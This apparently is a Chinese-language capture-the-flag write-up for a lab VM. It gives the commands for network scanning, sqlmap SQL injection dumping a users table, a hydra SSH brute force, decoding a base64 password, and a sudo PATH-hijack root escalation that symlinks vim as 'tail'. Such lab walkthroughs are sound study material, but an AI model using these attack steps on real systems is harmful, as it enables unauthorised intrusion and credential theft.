虚拟机简介：一个更简单的盒子，不需要强制执行。框上有两个flag：user和root标志，其中包含md5哈希

目标：2个flag

级别：初学者-中级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.9
查看开放22、8080端口

3、WEB渗透测试

3.1 使用dirb和nikto进行扫描没有发现有用信息，查看robots.txt也没有有用信息

随便输入一个不存在的页面时，提示一个错误页面信息，显示mercuryfacts

3.2 访问mercuryfacts页面后，点击load a fact，在URL中添加单引号报错

3.3 使用sqlmap进行爆破测试

sqlmap -u 'http://192.168.1.9:8080/mercuryfacts/1' --dbs --batch

sqlmap -u 'http://192.168.1.9:8080/mercuryfacts/1' -D mercury --tables --batch

sqlmap -u 'http://192.168.1.9:8080/mercuryfacts/1' -D mercury -T users --dump --batch

3.4 保存用户名和密码，使用hydra进行爆破ssh

hydra -L username.txt -P pass.txt  192.168.1.9 ssh

3.5 登录服务器，在当前目录下获取到第一个flag

ssh webmaster@192.168.1.9cat user_flag.txt

3.6 进入到mercury_proj，查看到note.txt中包含另外一个用户的密码信息

cd mercury_proj/cat notes.txtecho bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d

4、系统提权

4.1 切换到linuxmaster后，查看用户有脚本的sudo权限

su - linuxmastersudo -l

4.2 查看脚本使用tail查看最近10条，可以使用环境变量进行提权

cat /usr/bin/check_syslog.shln -s /usr/bin/vim tailexport PATH=.:$PATHsudo --preserve-env=PATH /usr/bin/check_syslog.sh:!/bin/bash按回车

当前用户已经为root

4.3 获取flag

cat /root/root_flag.txt
